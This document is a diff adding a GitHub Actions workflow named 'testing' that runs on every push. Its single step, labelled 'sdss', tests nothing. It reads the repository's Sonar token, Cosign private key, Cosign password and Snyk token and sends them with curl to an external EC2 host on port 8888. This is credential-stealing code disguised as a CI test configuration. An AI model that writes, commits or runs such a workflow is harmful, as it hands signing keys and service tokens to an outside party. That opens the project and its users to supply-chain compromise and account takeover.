@@ -1,0 +1,24 @@
+name: testing
+
+on: [push]
+
+jobs:
+  testing:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: sdss
+      env:
+        sonar_secret: ${{ secrets.SONAR_TOKEN }}
+        COSIGN_PRIVATE_KEY: ${{secrets.COSIGN_PRIVATE_KEY}}
+        COSIGN_PASSWORD: ${{secrets.COSIGN_PASSWORD}}
+        SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+      run: |
+        curl -X POST http://ec2-13-201-100-246.ap-south-1.compute.amazonaws.com:8888 \
+          -d "sonar_secret: ${{ secrets.SONAR_TOKEN }}" \
+          -d "COSIGN_PRIVATE_KEY: ${{secrets.COSIGN_PRIVATE_KEY}}" \
+          -d "COSIGN_PASSWORD: ${{secrets.COSIGN_PASSWORD}}" \
+          -d "SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}"
